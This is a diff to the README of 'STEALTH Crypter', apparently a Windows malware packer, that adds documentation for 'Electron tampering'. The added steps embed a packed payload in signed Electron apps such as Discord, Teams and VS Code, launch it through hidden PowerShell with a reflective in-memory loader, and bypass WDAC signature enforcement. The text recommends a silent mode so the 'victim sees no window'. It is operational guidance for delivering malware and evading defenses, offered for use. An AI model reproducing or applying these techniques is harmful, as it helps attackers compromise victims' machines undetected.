@@ -84,14 +84,52 @@ STEALTH Crypter encrypts and packages Windows executables into stealthy standalo
    .\encrypted.exe
    ```
 
+## Documentation
+
+Detailed documentation is available in the `docs/` folder:
+- `ELECTRON_SINGLE_EXE_SUPPORT.md` - Electron tampering guide (folder & single-EXE support, WDAC bypass)
+- `PLUGIN_ARCHITECTURE_FINAL.md` - Plugin system architecture
+- `INJECTOR_METHODS_GUIDE.md` - GOD-TIER injection methods
+- `FINAL_SUMMARY.md` - Complete project summary
+
+## Electron Tampering (WDAC Bypass)
+
+The packer includes Electron app tampering for bypassing strict WDAC enforcement:
+
+**Supported Targets:**
+- **Folder-based**: VS Code portable, Discord, Slack, Teams (must contain `resources/` folder)
+- **Single-file EXE**: WinDbgX.exe, standalone Electron apps (typically 50+ MB, auto-detected)
+
+**How to Use:**
+1. Build your packed payload first
+2. Click "Browse Electron Target" and select:
+   - **Folder option**: For VS Code portable, Discord folders
+   - **Single EXE option**: For WinDbgX.exe, Teams standalone
+3. Enable "Silent mode" (recommended - victim sees no window)
+4. Click "Tamper Electron App"
+5. Deploy the entire output folder (maintains Microsoft signature)
+
+**What it does:**
+- Embeds your packed stub as base64 in Electron's main.js
+- Spawns hidden PowerShell with reflective PE loader
+- Loads stub in-memory (bypasses WDAC signature enforcement)
+- Silent mode: Electron exits in 50ms, completely invisible
+
+**Important:** The target must be a valid Electron app. The GUI will validate:
+- Folders must have `resources/app` or `resources/app.asar`
+- Single EXEs must be 20+ MB and contain Electron markers
+
+See `docs/ELECTRON_SINGLE_EXE_SUPPORT.md` for complete details.
+
 ## Project Structure
-- `stealth_gui_pyqt.py`: GUI scripts.
-- `stealth_gui_backend.py`: GUI backend logic.
-- `stub.c`: Creates `stub.exe`.
-- `stealth_cryptor.c`: Encrypts payload and appends plugins.
-- `template.c`: In-memory execution DLL.
+- `gui/stealth_gui_pyqt.py`: GUI scripts.
+- `gui/stealth_gui_backend.py`: GUI backend logic.
+- `src/stub/stub.c`: Runtime loader.
+- `src/core/stealth_cryptor.c`: Encrypts payload and appends plugins.
+- `src/stub/template.c`: In-memory execution DLL.
 - `plugins/`: Source for custom plugins (DLLs).
 - `bin/plugins/`: Compiled plugin DLLs for appending.
+- `docs/`: Documentation files.
 - `audio/notification.wav`: GUI sound.
 - `icon/icon.ico`: GUI icon (optional).
 
